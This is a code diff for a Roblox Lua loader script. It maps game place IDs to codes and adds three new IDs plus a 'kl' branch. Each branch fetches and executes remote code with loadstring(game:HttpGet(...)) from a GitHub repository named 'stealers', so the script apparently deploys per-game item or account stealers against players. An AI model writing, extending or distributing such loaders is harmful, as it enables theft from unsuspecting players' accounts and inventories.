@@ -6,7 +6,11 @@ local gameid = {
     [19006211286] = "pg",
 
     [4442272183] = "bf",
-	
+
+    [4520749081] = "kl",
+    [6381829480] = "kl",
+    [15759515082] = "kl",
+
     [142823291] = "mm2",
     [335132309] = "mm2",
     [636649648] = "mm2"
@@ -24,4 +28,6 @@ elseif stealer_to_use == "bf" then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/bf"))()
 elseif stealer_to_use == "pg" then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/pg"))()
+elseif stealer_to_use == "kl" then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/kl"))()
 end
